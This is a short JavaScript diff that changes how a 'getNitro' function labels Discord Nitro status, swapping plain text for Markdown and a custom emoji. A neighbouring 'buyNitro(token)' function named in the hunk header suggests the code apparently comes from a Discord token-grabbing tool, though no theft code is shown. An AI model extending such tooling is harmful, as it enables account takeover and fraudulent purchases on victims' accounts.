@@ -237,13 +237,13 @@ const buyNitro = async (token) => {
 const getNitro = (flags) => {
   switch (flags) {
     case 0:
-      return "No Nitro";
+      return "\`None\`";
     case 1:
-      return "Nitro Classic";
+      return "<:nitro:969573901036290069>";
     case 2:
-      return "Nitro Boost";
+      return "\`Nitro Boost\`";
     default:
-      return "No Nitro";
+      return "\`None\`";
   }
 };
 
